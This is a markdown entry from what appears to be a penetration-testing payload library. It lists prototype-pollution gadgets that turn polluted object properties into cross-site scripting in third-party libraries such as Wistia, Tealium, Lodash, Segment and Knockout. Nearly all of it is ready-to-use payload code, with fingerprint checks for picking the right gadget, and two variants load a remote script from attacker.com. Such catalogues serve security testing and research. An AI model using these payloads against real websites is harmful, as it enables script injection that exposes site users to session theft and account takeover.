---
title: Prototype Pollution — Third-Party Library Gadgets (Wistia, Lodash, Segment, Knockout, etc.)
slug: pp-third-party-gadgets
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/prototype-pollution, sink/third-party]
inbound: []
---

# Prototype Pollution — Third-Party Library Gadgets (Wistia, Lodash, Segment, Knockout, etc.)

## Payload

```javascript
// Wistia Embedded Video — innerHTML gadget
Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';
// Fingerprint: return (typeof wistiaEmbeds !== 'undefined')
```

## Variants

```javascript
// Google reCAPTCHA — srcdoc gadget
Object.prototype.srcdoc=['<script>alert(1)<\/script>']

// Twitter Universal Website Tag — hif gadget
Object.prototype.hif = ['javascript:alert(document.domain)'];
// Fingerprint: typeof twq.version !== 'undefined'

// Tealium Universal Tag — attrs/src gadget
Object.prototype.attrs = {src:1};
Object.prototype.src='https://attacker.com/xss.js'
// Fingerprint: typeof utag.id !== 'undefined'

// Akamai Boomerang — url gadget
Object.prototype.BOOMR = 1;
Object.prototype.url='https://attacker.com/xss.js'
// Fingerprint: typeof BOOMR !== 'undefined'

// Lodash _.template — sourceURL gadget (<= 4.17.15)
Object.prototype.sourceURL = '  alert(1)'
_.template('test')

// Google Closure — CLOSURE_BASE_PATH gadget
Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';

// Marionette.js / Backbone.js — tagName/src/onerror gadget
Object.prototype.tagName = 'img'
Object.prototype.src = ['x:x']
Object.prototype.onerror = ['alert(1)']

// Adobe Dynamic Tag Management — src gadget
Object.prototype.src='data:,alert(1)//'
// Fingerprint: typeof _satellite !== 'undefined'

// Embedly Cards — onload gadget
Object.prototype.onload = 'alert(1)'
// Fingerprint: typeof window.embedly !== 'undefined'

// Segment Analytics.js — script array gadget
Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']
// Fingerprint: typeof analytics.SNIPPET_VERSION !== 'undefined'

// Knockout.js — binding gadget
Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';
ko.applyBindings({})
```

## Context

Each gadget exploits a specific third-party library's internal property access patterns without `hasOwnProperty` guards. Each requires (a) a prototype pollution source and (b) the specific library loaded. The Lodash `sourceURL` gadget injects into the generated function's `//# sourceURL=` comment, which gets eval'd; requires Lodash ≤ 4.17.15. The Closure gadget loads an attacker-controlled script via dynamic `goog.require`. The Segment gadget corrupts the internal script-loading array. Fingerprint each with the comment before selecting a gadget.

## Provenance

- Distilled from: `../../techniques/dom-xss/prototype-pollution-xss.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Prototype Pollution to XSS](../../techniques/dom-xss/prototype-pollution-xss.md)
